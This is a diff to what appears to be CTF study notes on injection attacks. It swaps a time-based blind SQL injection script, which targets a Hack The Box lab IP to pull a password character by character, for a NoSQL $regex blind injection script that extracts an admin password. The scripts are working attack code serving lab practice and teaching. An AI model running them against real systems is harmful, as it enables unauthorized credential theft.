@@ -32,33 +32,27 @@ SELECT column_name(s) FROM table2 -> clause 2
 - base on response as like as error, timeout to collect data
 example:
 ```
-import requests, string, time
-arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
-s = requests.session()
-url = 'http://188.166.173.208:30042/api/list'
+import requests, string
+req = requests.session()
+arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
 
-def bind(step):
+def blind(data):
     for char in arr:
-        a = time.time()
-        s.post(url,data={'order':f"(select case when (select ascii(mid((select password from users  where username='flagholder'),{step},1))) LIKE {ord(char)} then sleep(0.6) else 1 end)"})
-        b = time.time()
-        if b-a > 4:
+        res = req.post('http://0.0.0.0/api/sqliMongo',json={'username':'admin','password':{"$regex": f"^{data}{char}"}}).json()
+        if res['data']:
             return char
     return None        
 
-def flag():
-    flag = 'HTB{'
-    step = len(flag) + 1 
+def dump_data():
+    data = '' 
     while True:
-        c = bind(step)
-        if c==None or c=='}':
-            return flag + c
-            
-        flag += c 
-        step += 1
-        print('[+] flag = ',flag)
+        char = blind(data)
+        if char == None:
+            return data 
+        data += char 
+        print('[+] password: = ',data)
 
-print('[+] flag = ',flag())
+print('[+] password found : ',dump_data())
 ```
 
 ### 2.3. Nosql injection
